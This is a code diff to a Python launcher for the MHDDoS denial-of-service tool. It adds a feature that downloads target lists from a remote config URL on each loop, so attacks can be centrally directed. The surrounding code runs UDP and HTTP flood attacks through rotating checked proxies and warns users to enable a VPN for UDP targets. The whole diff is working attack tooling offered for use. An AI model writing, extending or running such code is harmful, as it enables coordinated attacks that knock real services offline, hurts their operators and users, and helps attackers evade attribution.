@@ -8,8 +8,36 @@ import sys
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-from MHDDoS.start import ProxyManager
+import requests
+from MHDDoS.start import ProxyManager, logger
 from PyRoxy import ProxyChecker, ProxyType
+
+
+class Targets:
+    def __init__(self, targets, config):
+        self.targets = targets
+        self.config = config
+        self.config_targets = []
+
+    def __iter__(self):
+        self.load_config()
+        for target in self.targets + self.config_targets:
+            yield target
+
+    def load_config(self):
+        if not self.config:
+            return
+
+        try:
+            config_content = requests.get(self.config, timeout=5).text
+        except requests.RequestException:
+            logger.warning('Could not load new config, proceeding with the last known good one')
+        else:
+            self.config_targets = [
+                target.strip()
+                for target in config_content.split()
+                if target.strip()
+            ]
 
 
 def update_proxies(period, proxy_timeout, targets):
@@ -27,12 +55,12 @@ def update_proxies(period, proxy_timeout, targets):
 
     CheckedProxies = []
     size = len(targets)
-    print(f'{len(Proxies):,} Proxies are getting checked, this may take a while:')
+    logger.info(f'{len(Proxies):,} Proxies are getting checked, this may take a while:')
 
     futures = []
     with ThreadPoolExecutor(size) as executor:
         for target, chunk in zip(targets, (Proxies[i::size] for i in range(size))):
-            print(f'{len(chunk):,} Proxies are getting checked against {target}')
+            logger.info(f'{len(chunk):,} Proxies are getting checked against {target}')
             futures.append(
                 executor.submit(
                     ProxyChecker.checkAll,
@@ -47,7 +75,8 @@ def update_proxies(period, proxy_timeout, targets):
             CheckedProxies.extend(future.result())
 
     if not CheckedProxies:
-        exit("Proxy Check failed, Your network may be the problem | The target may not be available.")
+        logger.error("Proxy Check failed, Your network may be the problem | The target may not be available.")
+        exit()
 
     os.makedirs('files/proxies/', exist_ok=True)
     with open('files/proxies/proxies.txt', "w") as all_wr, \
@@ -68,7 +97,7 @@ def run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, deb
     for target in targets:
         # UDP
         if target.lower().startswith('udp://'):
-            print(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
+            logger.warning(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
             params_list.append([
                 'UDP', target[6:], str(udp_threads), str(period)
             ])
@@ -104,8 +133,13 @@ def run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, deb
 
 def start(total_threads, period, targets, rpc, udp_threads, http_methods, proxy_timeout, debug):
     os.chdir('MHDDoS')
-    no_proxies = all(target.lower().startswith('udp://') for target in targets)
     while True:
+        targets = list(targets)
+        if not targets:
+            logger.error('Must provide either targets or a valid config file')
+            exit()
+
+        no_proxies = all(target.lower().startswith('udp://') for target in targets)
         if not no_proxies:
             update_proxies(period, proxy_timeout, targets)
         run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, debug)
@@ -115,8 +149,13 @@ def init_argparse() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser()
     parser.add_argument(
         'targets',
-        nargs='+',
+        nargs='*',
         help='List of targets, separated by spaces',
+    )
+    parser.add_argument(
+        '-c',
+        '--config',
+        help='URL to a config file',
     )
     parser.add_argument(
         '-t',
@@ -197,7 +236,7 @@ if __name__ == '__main__':
     start(
         args.threads * multiprocessing.cpu_count(),
         args.period,
-        args.targets,
+        Targets(args.targets, args.config),
         args.rpc,
         args.udp_threads,
         args.http_methods,
